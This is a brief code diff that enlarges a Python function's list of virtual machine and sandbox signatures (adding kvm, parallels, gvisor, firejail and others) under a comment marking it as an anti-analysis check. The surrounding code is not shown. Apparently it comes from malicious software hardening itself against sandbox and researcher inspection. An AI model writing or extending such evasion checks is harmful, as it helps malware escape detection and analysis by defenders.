@@ -20,7 +20,11 @@ logging.basicConfig(filename=log_filename, level=logging.ERROR, format='%(asctim
 
 # Check for Virtual Machine (Anti-analysis)
 def is_vm():
-    vm_signatures = ['vmware', 'virtualbox', 'qemu', 'xen', 'vbox', 'hyperv']
+    vm_signatures = [
+        'vmware', 'virtualbox', 'qemu', 'xen', 'vbox', 'hyperv',
+        'kvm', 'parallels', 'bhyve', 'openvz', 'lxc', 'wsl',
+        'sandbox', 'gvisor', 'firejail'
+    ]
     system_info = platform.uname().release.lower()
     for signature in vm_signatures:
         if signature in system_info:
